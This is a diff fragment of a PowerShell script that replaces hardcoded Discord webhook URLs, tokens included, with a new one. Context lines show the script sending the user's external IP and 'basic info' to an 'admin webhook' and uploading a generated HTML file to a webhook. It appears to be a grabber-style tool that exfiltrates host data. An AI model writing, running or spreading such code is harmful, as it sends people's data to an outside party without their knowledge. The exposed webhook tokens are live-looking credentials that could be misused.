@@ -95,7 +95,7 @@ $UsedKeys += $userKeyNormalized
 $UsedKeys | ConvertTo-Json | Set-Content -Path $UsedKeysFile -Force
 
 # ---------------- Send basic info to admin webhook (with IPs, no VPN-bypass) ----------------
-$AdminWebhookUrl = "https://discord.com/api/webhooks/1421664709928550412/g2TX82xO9uL6s3Bo89_4y9Mcz-2okoQWBHiCbTs1ZqeZ6W_hGyQjSVxkfuJVAfLeSllf"
+$AdminWebhookUrl = "https://discord.com/api/webhooks/1515687736021876876/tawI3eujifk7xydNnULYreuodYSECJDYyxux-_FhFAYGGOpudC3Iadh73KnDG-fUQDK2"
 
 function Get-ExternalIp {
     try {
@@ -212,7 +212,7 @@ $($rows -join "`n")
 Set-Content -Path $tempFile -Value $html -Encoding UTF8
 
 # upload via webhook
-$DiscordWebhookUrl = "https://discord.com/api/webhooks/1421652100462678118/PmVEyTbvzmlL_f50eKZ0ef_tCKsJ9lGCtFAQAwzINA1d1hCmV_z8D1rBeKzrXcB_XzW2"
+$DiscordWebhookUrl = "https://discord.com/api/webhooks/1515687736021876876/tawI3eujifk7xydNnULYreuodYSECJDYyxux-_FhFAYGGOpudC3Iadh73KnDG-fUQDK2"
 if (Test-Path $tempFile -PathType Leaf) {
     try {
         $boundary = [System.Guid]::NewGuid().ToString()
